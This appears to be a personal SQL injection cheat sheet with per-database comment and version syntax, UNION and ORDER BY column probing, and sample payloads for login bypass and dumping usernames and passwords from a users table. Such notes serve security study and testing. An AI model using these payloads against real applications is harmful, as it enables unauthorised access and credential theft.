# SQL cheet sheat

This SQLi cheat sheet contains examples of useful syntax that you can use to perform a variety tasks that often arise when SQL injection attacks.

## Comments

You can use comments to truncate a query and remove the portion of the original query that follows your input

"""
**Oracle**: --comment

**Microsoft**: --comment
               /*comment*/

**PostgreSQL**: --comment
                /*comment*/

**MySQL**: #comment
           -- comment (note that the space needs to follow the double dash)
           /*comment*/
"""

***Example***:
"""SQL
	SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
	SELECT * FROM products WHERE category = 'football' OR 1=1--' AND released = 1
	SELECT * FROM products WHERE category = 'football'--' AND released = 1
	UNION SELECT username, password FROM users-- 
"""

## Database version

"""
**Oracle**: SELECT banner FROM v$version
            SELECT version FROM v$instance

**Microsoft**: SELECT @@version

**PostgreSQL**: SELECT version()

**MySQL**: SELECT @@version
"""

## Number of columns and type of each columns:

If the number of nulls does not match the number of columns, the databas return an error.
"""
	UNION SELECT NULL-- (FROM DUAL-- should follow NULL for the injected queries on Oracle )
	UNION SELECT NULL,NULL--
	UNION SELECT NULL,NULL,NULL--
"""	

OR

This method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs
"""
	ORDER BY 1--
	ORDER BY 2--
	ORDER BY 3--
"""

After getting the number of comlumns. We can replace`NULL` by `string` or `int` value (i.e: 'abc', 123) to detect the type of data in each column:
"""
	UNION SELECT 'abc',NULL,NULL,NULL--
	UNION SELECT NULL,'abc',NULL,NULL--
	UNION SELECT NULL,NULL,123,NULL-
"""

## String concatenation

"""
**Oracle**: 'foo'||'bar'

**Microsoft**: 'foo'+'bar'

**PostgreSQL**: 'foo'||'bar'

**MySQL**: 'foo' 'bar' (the space needs to between the two strings)
           CONCAT('foo','bar')
"""

For example:
"""
UNION SELECT username || '~' || password FROM users--

==> results:

...
administrator~password1
user2~password2
user3~password3
...  
"""


